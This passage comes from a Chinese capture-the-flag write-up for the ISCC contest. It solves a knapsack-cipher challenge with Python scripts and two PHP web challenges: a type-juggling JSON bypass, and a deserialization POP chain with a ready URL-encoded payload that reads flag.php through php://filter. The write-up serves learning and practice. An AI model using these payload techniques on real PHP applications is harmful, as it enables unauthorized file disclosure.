class="hljs-params">n</span>):<br>	privKey = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>**n)]<br>	s = privKey[<span class="hljs-number">0</span>]<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, n):<br>		privKey.append(random.randint(s + <span class="hljs-number">1</span>, <span class="hljs-number">4</span>**(n + i)))<br>		s += privKey[i]<br>	q = random.randint(privKey[n-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>*privKey[n-<span class="hljs-number">1</span>])<br>	r = random.randint(<span class="hljs-number">1</span>, q)<br>	<span class="hljs-keyword">while</span> gmpy2.gcd(r, q) != <span class="hljs-number">1</span>:<br>		r = random.randint(<span class="hljs-number">1</span>, q)<br>	pubKey = [ r*w % q <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> privKey ]<br>	<span class="hljs-keyword">return</span> privKey, q, r, pubKey<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, pubKey</span>):<br>	msg_bit = msg<br>	n = <span class="hljs-built_in">len</span>(pubKey)<br>	cipher = <span class="hljs-number">0</span><br>	i = <span class="hljs-number">0</span><br>	<span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> msg_bit:<br>		cipher += <span class="hljs-built_in">int</span>(bit)*pubKey[i]<br>		i += <span class="hljs-number">1</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">bin</span>(cipher)[<span class="hljs-number">2</span>:]<br><br><br><br>flaggg=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ffalg.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-comment"># secret = input(&#x27;Plz input the FLAG to generate the question.&#x27;)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>	fe = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;enc.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>	fpub = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pub.Key&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>	fpriv = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;priv.Key&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>	fq = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;q.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>	fr = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><br>	<span class="hljs-built_in">print</span>(i)<br>	tt=<span class="hljs-string">&quot;ISCC&#123;&quot;</span><br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>		temp=getRandom()<br>		tt=tt+temp+<span class="hljs-string">&#x27;-&#x27;</span><br>	secret = tt[:-<span class="hljs-number">1</span>]+<span class="hljs-string">&#x27;&#125;&#x27;</span><br>	flaggg.write(secret)<br>	flaggg.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>	msg_bit = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(codecs.encode(secret.encode(), <span class="hljs-string">&#x27;hex&#x27;</span>), <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]<br>	keyPair = makeKey(<span class="hljs-built_in">len</span>(msg_bit))<br>	pub_str = <span class="hljs-string">&#x27;[&#x27;</span>+<span class="hljs-string">&#x27;, &#x27;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> keyPair[<span class="hljs-number">3</span>]]) + <span class="hljs-string">&#x27;]&#x27;</span><br>	fpub.write(pub_str)<br>	<span class="hljs-comment">#print (&#x27;pub.Key: &#x27; + pub_str)</span><br>	enc =  encrypt(msg_bit, keyPair[<span class="hljs-number">3</span>])<br>	<span class="hljs-comment">#print (&#x27;enc: &#x27; + str(int(enc, 2)))</span><br>	fe.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(enc, <span class="hljs-number">2</span>)))<br>	priv_str = <span class="hljs-string">&#x27;[&#x27;</span>+<span class="hljs-string">&#x27;, &#x27;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> keyPair[<span class="hljs-number">0</span>]]) + <span class="hljs-string">&#x27;]&#x27;</span><br>	<span class="hljs-comment">#print (&#x27;priv.Key: &#x27; + priv_str)</span><br>	fpriv.write(priv_str)<br>	<span class="hljs-comment">#print(&#x27;q: &#x27; + str(keyPair[1]))</span><br>	fq.write(<span class="hljs-built_in">str</span>(keyPair[<span class="hljs-number">1</span>]))<br>	<span class="hljs-comment">#print(&#x27;r: &#x27; + str(keyPair[2]))</span><br>	fr.write(<span class="hljs-built_in">str</span>(keyPair[<span class="hljs-number">2</span>]))<br>	name=<span class="hljs-string">&quot;misc-example-&quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;.zip&quot;</span><br>	fe.close()<br>	fpub.close()<br>	fpriv.close()<br>	fq.close()<br>	fr.close()<br><br>	os.system(<span class="hljs-string">&quot;zip -r -P&#x27;wELC0m3_T0_tH3_ISCC_Zo2z&#x27; tzt2.zip enc.txt generator.py priv.Key pub.Key q.txt r.txt&quot;</span>)<br>	os.system(<span class="hljs-string">&quot;zip -r ./output/&#123;&#125;.zip tzt.png tzt2.zip&quot;</span>.<span class="hljs-built_in">format</span>(name))<br><br><br>flaggg.close()<br></code></pre></td></tr></table></figure>
<p>加密部分：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, pubKey</span>):<br>	msg_bit = msg<br>	n = <span class="hljs-built_in">len</span>(pubKey)<br>	cipher = <span class="hljs-number">0</span><br>	i = <span class="hljs-number">0</span><br>	<span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> msg_bit:<br>		cipher += <span class="hljs-built_in">int</span>(bit)*pubKey[i]<br>		i += <span class="hljs-number">1</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">bin</span>(cipher)[<span class="hljs-number">2</span>:]<br><br></code></pre></td></tr></table></figure>
<p>这里就可以知道cipher就是选择若干个pubKey相加，而选择哪一方相加是由明文决定<br><img src="https://img-blog.csdnimg.cn/dfe7227c9705461d986f560610f41b00.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>如果但从这里看，可以尝试暴力说不定可以，不过很明显不靠谱<br>然后看看密钥的生成</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeKey</span>(<span class="hljs-params">n</span>):<br>	privKey = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>**n)]<br>	s = privKey[<span class="hljs-number">0</span>]<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, n):<br>		privKey.append(random.randint(s + <span class="hljs-number">1</span>, <span class="hljs-number">4</span>**(n + i)))<br>		s += privKey[i]<br>	q = random.randint(privKey[n-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>*privKey[n-<span class="hljs-number">1</span>])<br>	r = random.randint(<span class="hljs-number">1</span>, q)<br>	<span class="hljs-keyword">while</span> gmpy2.gcd(r, q) != <span class="hljs-number">1</span>:<br>		r = random.randint(<span class="hljs-number">1</span>, q)<br>	pubKey = [ r*w % q <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> privKey ]<br>	<span class="hljs-keyword">return</span> privKey, q, r, pubKey<br></code></pre></td></tr></table></figure>
<p>得到的信息<br>公钥生成方式是r*w %q<br>私钥是递增的并且大于之前私钥数之和<br>q大于最后一个私钥<br>首先可以先乘上逆元r，将cipher转换为在q上的私钥运算<br><img src="https://img-blog.csdnimg.cn/1ff918cf9fef4055aa41b885aa2189e2.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>q大于所有私钥之和，私钥是递增的，大于之前私钥之和。所以很明显 ，对于任意的prikey_i,如果加入cipher，它的地位是唯一的，也就是加上它  cipher &gt; prikey_i  不加上它  cipher  &lt;  prikey_i（从最大的prikey开始判断）<br>可以写出最一般的情况解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>):<br>    r = <br>    enc = <br>    q = <br>    <span class="hljs-comment">#enc =  encrypt(msg_bit, keyPair[3],keyPair[0],q)</span><br>    key = <br>    enc = (enc*gmpy2.invert(r,q))%q<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> enc - key[i] &gt; <span class="hljs-number">0</span>:<br>            enc -= key[i]<br>            flag =flag+<span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            flag+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(flag[::-<span class="hljs-number">1</span>]),<span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure>
<p>还有考虑一种特殊情况，就是之前的私钥值加上最后一个私钥值大于q的情况</p>
<p>此时需要先减去最后一个私钥值（mod q）,之后同上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>):<br>    r = <br>    enc = <br>    q = <br>    <span class="hljs-comment">#enc =  encrypt(msg_bit, keyPair[3],keyPair[0],q)</span><br>    key = <br>    enc = (enc*gmpy2.invert(r,q))%q<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    enc = (enc-key[-<span class="hljs-number">1</span>])%q<br>    flag+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)-<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> enc - key[i] &gt; <span class="hljs-number">0</span>:<br>            enc -= key[i]<br>            flag =flag+<span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            flag+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(flag[::-<span class="hljs-number">1</span>]),<span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure>
<p>这个题目确实是套中套,公钥生成方式是r*w %q，私钥是递增的并且大于之前私钥数之和，q大于最后一个私钥，首先可以先乘上逆元r，将cipher转换为在q上的私钥运算。题目挺有意思。增加了对密码学的见识。</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="冬奥会"><a href="#冬奥会" class="headerlink" title="冬奥会"></a>冬奥会</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$Step1</span>=False;<br><span class="hljs-variable">$Step2</span>=False;<br><span class="hljs-variable">$info</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Information&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$info</span>))&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$info</span>);<br>    <span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;year&quot;</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry~&quot;</span>):<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;year&quot;</span>])&#123;<br>        (<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;year&quot;</span>]=<span class="hljs-number">2022</span>)?<span class="hljs-variable">$Step1</span>=True:<span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>][<span class="hljs-number">1</span>])OR <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>])!==<span class="hljs-number">3</span> ) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry~&quot;</span>);<br>        <span class="hljs-variable">$status</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;skiing&quot;</span>, <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>]);<br>        <span class="hljs-variable">$status</span>===<span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry~&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;skiing&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry~&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-variable">$Step2</span>=True;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Step1</span> &amp;&amp; <span class="hljs-variable">$Step2</span>)&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;2022flag.php&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//array(0) &#123; &#125; </span><br></code></pre></td></tr></table></figure>
<p>代码审计，是get传参information<br>要求’year’为2022<br>‘item’为三个☞的数组 并且第[1]和的值是数组<br>因为是JSON_decode所以格式是{“key1”:obj “,”key2”:”obj2”….}<br>?Information&#x3D;{“year”:”2022a”,”items”:[“gh”,[“asaf”,”qweas”],0]}</p>
<p>这个题目收获了json数据的格式，以及三个等于号和两个等于号的区别。</p>
<h2 id="Pop2022"><a href="#Pop2022" class="headerlink" title="Pop2022"></a>Pop2022</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php">Happy New Year~ MAKE A WISH<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">/***************************pop your 2022*****************************/</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;page)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can Not Enter 2022&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-comment">/**********************Try to See flag.php*****************************/</span> <br></code></pre></td></tr></table></figure>
<p>题目的流程：<br>Road_is_Long.wakeup.page<br>$page-&gt;new Road_is_Long<br>$string-&gt;new Make_a_Change<br>$effort-&gt;new Try_Work_Hard<br>$var-&gt;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Make_a_Change</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br><span class="hljs-variable">$a</span>-&gt;page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();<br><span class="hljs-variable">$a</span>-&gt;page-&gt;<span class="hljs-keyword">string</span>-&gt;effort = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Try_Work_Hard</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?wish<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">12</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Road_is_Long<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>page<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">12</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Road_is_Long<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>page<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>string<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Make_a_Change<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>effort<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Try_Work_Hard<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>var<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">57</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>php<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>Ffilter<span class="hljs-variable">%2</span>Fread<span class="hljs-variable">%3</span>Dconvert.base<span class="hljs-number">64</span>-encode<span class="hljs-variable">%2</span>Fresource<span class="hljs-variable">%3</span>Dflag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>Ds<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>string<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Make_a_Change<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>effort<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure>
<p>通过这个题目收获了php序列化和反序列化。还有php伪协议读取文件内容。</p>
